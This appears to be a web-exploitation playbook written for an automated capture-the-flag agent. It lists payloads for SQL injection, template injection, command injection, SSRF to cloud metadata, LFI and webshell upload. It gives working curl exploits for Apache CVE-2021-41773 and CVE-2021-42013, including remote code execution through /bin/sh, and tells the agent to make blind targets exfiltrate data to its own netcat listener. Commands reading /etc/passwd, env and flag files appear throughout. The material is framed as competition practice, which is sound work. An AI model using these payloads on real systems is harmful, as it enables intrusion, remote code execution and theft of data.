# Web playbook (weight 25% — go deep)

Recon → scan → accounts → per-class checklist. For EACH class: probe, confirm,
exploit to flag.

1. **SQLi**: error-based first (`'`, `"`), then UNION (match column count with
   ORDER BY), then boolean/time blind via sqlmap --batch. Dump the table that
   holds flag/admin password.
2. **SSTI**: `{{7*7}}`, `{{config}}` in every param; Jinja/Twig/Smarty payloads;
   RCE via `''.__class__.__mro__` chain or `system()`.
3. **Command injection**: `;id`, `|id`, `` `id` ``, `$(id)`, newline `%0aid`;
   once confirmed, `cat /flag* /etc/passwd`, `env`, `ls -la /`.
4. **SSRF**: params taking URLs; hit internal `http://127.0.0.1:port`,
   `file:///etc/passwd`, cloud metadata `169.254.169.254`; bypass filters with
   redirects, decimal IP, `@`, dns rebinding alternatives.
5. **Path traversal / LFI**: `../../etc/passwd`, encodings, `....//`, php
   filters `php://filter/convert.base64-encode/resource=`; then RCE via log
   poisoning or session files.
6. **File upload**: webshell with double ext, `.pht/.phtml/.php5`, content-type
   spoof, magic bytes; find upload dir via dir scan.
7. **Deserialization**: PHP `unserialize` (phpggc patterns), Python pickle,
   Java (ysoserial patterns), Node `node-serialize`; JWT session cookies.
8. **XSS→admin**: fuzz `<>"'` filter profile; bypass; jsfuck if all filtered;
   aim for cookie exfil to your listener or stored flag in admin bot.
9. **XXE**: swap JSON→XML bodies; external entities `file://`, phar.
10. **Auth/IDOR (see system.md §4)**: register 2 accounts; enum IDs; role
    tamper; JWT attacks; password reset flow flaws; weak creds (admin/admin,
    hydra on login only if nothing else moves).
11. **Info leaks**: `.git/HEAD` → dump repo; `.env`, `actuator/`, `console/`,
    `phpinfo`, source in `.bak/.swp`, verbose errors, debug=True.

Flags hide in: DB rows, files readable after RCE/LFI, admin pages, response
headers of special routes, second-stage internal services (SSRF/pivot).

## Run-6661 iron rules (lost us a-07 — read before any WAF/XXE grind)

- **Bypass found ⇒ re-run EVERY blocked payload through it.** If a WAF
  blocked `<!DOCTYPE`/`php://filter`/`file://` and you later find a bypass
  (UTF-16/UTF-32 body encoding, case tweaks, comments, chunking), IMMEDIATELY
  retry all previously blocked payloads wrapped in the bypass. A payload
  blocked pre-bypass is NOT a dead end (a-07: UTF-16 bypassed the WAF but the
  `php://filter` base64 read was never retried through it → no exfil → fail).
- **Blind vuln without reflection ⇒ OOB to YOUR OWN listener.** The target
  shares your VPN segment and can reach your sandbox IP (`hostname -I`). For
  blind XXE/SSRF/RCE: start `nc -lvp 8888` (or python http.server) locally,
  make the target exfil to `http://<your-ip>:8888/<data>` — via parameter
  entities + external DTD (XXE), URL fetch (SSRF), or curl/wget in executed
  commands. Error-based second best: force file content into error text
  (e.g. PHP `PI php never end` proves a read worked — switch the wrapper
  until content surfaces).
- **Hidden JSON/form field ⇒ brute COMPOUND names, don't hand-guess.** When
  an endpoint answers "URL is required" / "missing field" for every name you
  try, the real key is usually a prefix+noun compound (a-14 died at 132 min
  because it never tried `target_endpoint`). Script it, diff vs the baseline
  error — one pass, not one-by-one:
  ```
  while read -r p; do
    curl -s -X POST "$URL" -H 'Content-Type: application/json' \
         -d "{\"$p\":\"http://127.0.0.1/\"}" | grep -qv "URL is required" \
      && echo "HIT param=$p"
  done < <(python "$HEHUA_ROOT/scripts/paramgen.py" --n 200)
  ```
  (paramgen.py prints seeds first, then prefix×noun snake+camel.)

## Web-server fingerprint → instant CVE (check the `Server:` header FIRST)

- **Apache/2.4.49** → CVE-2021-41773; **Apache/2.4.50** → CVE-2021-42013.
  Path traversal + RCE via DOUBLE-encoded dot-dot. Exact canonical forms —
  `/cgi-bin/` uses the NO-dot `%%32%65%%32%65`; `/icons/` uses `.%%32%65`.
  If single-encoded traversal 404s/400s you MUST try these (the #1 miss):
  ```
  # 2.4.49 read (single-encoded, cgi-bin):
  curl -s --path-as-is "http://T/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
  # 2.4.50 read (double-encoded): %%32%65%%32%65 decodes to ..
  curl -s --path-as-is "http://T/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd"
  curl -s --path-as-is "http://T/icons/.%%32%65/.%%32%65/.%%32%65/etc/passwd"
  # 2.4.50 RCE: POST body is piped to /bin/sh (needs mod_cgi + ScriptAlias):
  curl -s --path-as-is -d 'echo; id; cat /flag* /flag.txt /root/flag.txt /challenge/flag.txt 2>/dev/null' \
    "http://T/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh"
  ```
  Also try the `%252e%252e/` variant. RCE needs a CGI-enabled mapped URI
  (ScriptAlias /cgi-bin/); if it 404s, the box may only allow file read.
  Flag at /flag, /flag.txt, /root/flag.txt, or /challenge/flag.txt.
- **Werkzeug/Flask**: probe `/console` (debug shell — if open, RCE via
  `__import__('os').popen('cat /flag*').read()`); SSTI in any reflected param
  (`{{config}}`, `{{7*7}}`); and DEBUG error pages leak source/paths.
- **Flag hygiene**: flags are `flag{...}`. Extract the WHOLE token incl. both
  braces before submitting (`grep -oE 'flag\{[^}]+\}'`); a truncated or
  brace-less string is a wasted submit.

## Field notes round-0 (one-line unlockers — check these BEFORE grinding)

- **.htaccess blocks HTTP requests, NOT LFI reads**: an LFI that "can't read
  config.php because .htaccess denies it" is a misread — read it via the LFI.
- WAF blocks DOCTYPE/entities ⇒ **XInclude XXE** (xmlns:xi inside body, no
  DOCTYPE needed).
- Old nginx + "static service migration" hints ⇒ **nginx alias traversal**
  to read files like JWT signing keys; also try kid=/dev/null, kid path
  traversal before wordlists.
- Python pollution/set_ filters on the KEY STRING ⇒ send the path as a
  **JSON array** (list paths skip string filters); read /src first and attack
  the exact filter.
- Description-disclosed internal endpoints (SSRF targets) ⇒ pivot IMMEDIATELY
  with file/gopher/dict schemes; do not re-discover.
- Go services on internal nets ⇒ **/debug/pprof** and /debug/vars first.
- pydash pollution: pydash≥6 RESTRICTS `__globals__`/`__builtins__` (KeyError
  "restricted" = version ≥6) and does NOT parse bracketed string keys as path
  segments (they become literal attrs) ⇒ the `__file__`-swap read only works
  on OLD pydash; probe version via error text before grinding paths.
- HugeGraph ≤1.2: gremlin SecurityManager blocks file/exec/URL; arthas runs
  inside on 8561/8562 UNEXPOSED ⇒ remaining chain = raw-Socket SSRF from
  gremlin to 127.0.0.1:8561 arthas API (ognl read).
- Gradio 4.12: /component_server needs session_hash+component_id;
  move_resource_to_blocklist 500s (removed) ⇒ prefer /file= with allowed
  /tmp/gradio prefix or upload-path tricks.
